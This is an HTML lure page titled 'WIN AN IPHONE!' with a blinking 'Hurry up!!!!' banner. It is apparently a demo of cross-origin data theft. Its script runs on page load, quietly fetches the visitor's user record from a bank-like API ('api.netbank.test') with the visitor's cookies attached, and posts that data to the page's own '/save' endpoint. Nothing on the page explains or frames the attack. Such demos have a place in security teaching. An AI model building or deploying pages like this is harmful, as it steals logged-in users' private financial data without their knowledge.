<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WIN AN IPHONE!</title>
  <style>
    body {
      font-family: 'Comic Sans MS', fantasy;
    }

    h1 {
      color: blue;
      font-size: 60px;
      text-align: center;
    }

    @keyframes blink {
      50% {
        opacity: 0;
      }
    }

    h2 {
      animation: blink 600ms linear infinite;
      color: red;
      font-size: 40px;
      text-align: center;
    }

    img {
      display: block;
      margin: 50px auto;
    }
  </style>
</head>
<body>
  <h1>WIN AN IPHONE!</h1>
  <h2>Hurry up!!!!</h2>
  <img src="iphone.jpg" width="332" height="454" alt="iphone">
  <script>
    (() => {
      const freeIphone = async () => {
        response = await fetch('https://api.netbank.test/user', {
          credentials: 'include',
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
        });

        const data = await response.json();

        await fetch('/save', {
          credentials: 'include',
          method: 'POST',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            data,
          }),
        });
      };

      freeIphone();
    })();
  </script>
</body>
</html>
